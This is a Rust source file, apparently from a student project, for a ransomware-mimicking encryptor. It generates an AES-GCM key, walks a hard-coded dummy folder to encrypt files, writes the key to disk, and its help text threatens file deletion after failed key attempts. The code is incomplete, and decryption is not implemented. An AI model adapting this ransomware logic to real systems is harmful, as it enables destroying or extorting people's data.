extern crate aes;
extern crate aes_gcm;
mod encryptor;
use encryptor::keystuff;
use fyp::traversal;
use aes_gcm::aead::KeyInit;
use fyp::encryptor::verkey;
use fyp::traversal::traverse_directory;
use std::env;
use std::fs::File;
use std::io;
use std::io::prelude::*;
use std::io::Read;
use std::path::Path;
use std::str;

//use aes_gcm::*;
fn fileinp(args: &Vec<String>) -> String {
    let mut input = String::new();
    if args.iter().any(|x| x == "-f" || x == "--file") {
        println!("Enter file input - ");
        match io::stdin().read_line(&mut input) {
            Ok(n) => {
                println!("{} bytes read", n);
                println!("{}", &input);
                return input;
            }
            Err(error) => {
                println!("error: {}", error);
                return input;
            }
        }
    } else {
        return input;
    };
}
fn main() {

    // let mut ks : keystuff = keystuff{
    //    keym : Key<Aes256Gcm>,
    //    noncem : 
    //   };
    env::set_var("RUST_BACKTRACE", "1");
    let _input = String::new();
    let mut flage = true;
    let mut input = String::new();
    let c: [&str; 8] = [
        "-h",
        "--help",
        "-v",
        "--verbose",
        "-f",
        "--file",
        "-d",
        "--decrypt",
    ];
    let args: Vec<String> = env::args().collect();
    let mut modev = false;
    let mut deckey = String::new();
    let help = "Help menu : Hello, this is a file encryptor in rust designed to mimic the workings of a ransomware
    we have a few parameters available, by few I mean 2. Help and verbose. -h or --help for this menu. Congratulations for cracking it. 
    -v or --verbose for verbose output. 
    -f or --file will prompt you to enter a single file for encryption
    -d or --decrypt changes the mode to decrypt, please be aware only 3 attempts to provide key are allowed, before file deletion
    no, currently you can't use both together, in the future when more are added, you may.";
    let mut flag = false;
    for i in c {
        for j in &args {
            if i == j {
                flag = true;
                break;
            }
        }
    }

    if !flag && args.clone().len() > 1 {
        println!("Error : unrecognised parameter, please use help option for more information - exit code 1");
        std::process::exit(1)
    }

    if args.clone().iter().any(|x| x == "-h" || x == "--help") && args.clone().len() > 2 {
        println!(
            "Error : can't use help with other parameters - exit code 1
      Did you want just help? Here's help -"
        );
        println!("{}", help);
        std::process::exit(1);
    } else if args.clone().iter().any(|x| x == "-h" || x == "--help") {
        println!("{}", help);
    }

    if args.clone().iter().any(|x| x == "-v" || x == "--verbose") {
        modev = true;
        println!("Mode is verbose, process has started");
        input = fileinp(&args);
    }
    if flage{
        let mut ks = encryptor::keygen();
        let mut keyfile = File::create("keyf.txt").expect("Failed to create file");

        
        traversal::traverse_directory(Path::new(r"C:\dummy folder"), true,&ks);
        keyfile
        .write_all(ks.keym.as_ref())
         .expect("Failed to write key to file");
     keyfile
       .write_all(ks.noncem.as_ref())
        .expect("Failed to write key to file");
    }


    if args.clone().iter().any(|x| x == "-d" || x == "--decrypt") {
        if !modev {
            input = fileinp(&args);
        }
        flage = false;
        println!("Enter decryption key file path - ");
        let mut inp = String::new();
        match io::stdin().read_line(&mut inp) {
            Ok(_n) => {
                println!("{} bytes read", inp);
                println!("{}", &inp);
                deckey = inp;
            }
            Err(error) => {
                println!("error: {}", error);
            }
        }
        //static file path 
        let kpath = Path::new(r"C:\Users\ismiv\fyp\fyp\src\keyfcopy.txt");
        let mut kflag = verkey(kpath);
        if kflag {
          println!("success, key is correct");
          
        } else {println!("wrong file, u have n-1 attempts");}
    }
    input = fileinp(&args);
    println!("{}", &input);
    let myPath = Path::new(r"C:\Users\ismiv\fyp\fyp\src\hello.txt");

    let mut strg = String::new();
   

}
